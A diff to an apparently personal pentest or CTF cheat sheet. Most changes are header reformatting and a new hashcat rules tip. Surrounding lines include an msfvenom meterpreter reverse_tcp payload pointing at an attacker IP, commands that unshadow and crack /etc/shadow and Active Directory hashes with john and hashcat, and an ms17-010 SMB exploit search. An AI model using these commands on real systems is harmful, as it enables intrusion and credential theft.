@@ -29,6 +29,7 @@ toc: true
 - **Check Priv esc for different CMS .**
 - **Check If we find a git directory (gitea or smt similar)**
 - **Check the var/www directory for internal websites .**
+- **Check the Privesc Section Below (Way more detailed)**
 - **After Root :**
 - **Check the shadow file and root folder for important files , maybe some creds , crack the shadow file , you will need the passwd + shadow = unshadow then John .**
  
@@ -285,7 +286,8 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.15.59 LPORT=4443 -f war -o 
 
 ```bash
 
-** Files **
+****** Files ******
+ 
 ===> XSLX : 
 
 office2john file.xlsx > file.john 
@@ -309,7 +311,7 @@ gpg2john Key.asc > ForJohn .
 gpg --import Key.asc . 
 gpg --decrypt File.gpg . 
 
-### JOHN THE RIPPER QUICK CRACKING GUIDE
+******* JOHN THE RIPPER QUICK CRACKING GUIDE ******
 
 # PREPARE HASHES DUMPED FROM LINUX FOR JOHN
 unshadow /etc/passwd /etc/shadow > hashes.txt
@@ -327,16 +329,26 @@ john --format=NT --wordlist=rockyou.txt hashes.txt
  unshadow pass shadow > unshadow
 john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=md5crypt-long unshadow
 
-**Active Directory Hashcracking :**
+
+***** Active Directory Hashcracking: ******
 
 # DCC2 Hashes mode :
 hashcat -m 2100 Helly.DC02 /usr/share/wordlists/rockyou.txt
 
 # TGS with AES 128 :
 hashcat -m 19700 hashesss /usr/share/wordlists/rockyou.txt
+
+***** Cracking RULES ******
+
+==> If rockyou doesn't work , Always use Hashcat rules before generating custom Wordlists :
+hashcat -r /usr/share/hashcat/rules/best66.rule
+
 ```
 
-## PFSense :
+
+## Some Services : 
+
+### PFSense :
 
 ```bash
 Username : can be anything 
@@ -355,7 +367,7 @@ Since we did env command  from earlier and we go that $HOME is / .
 
 ```
 
-## SMB Exploitation :
+### SMB Exploitation :
 
 ```bash
 search ms17-010
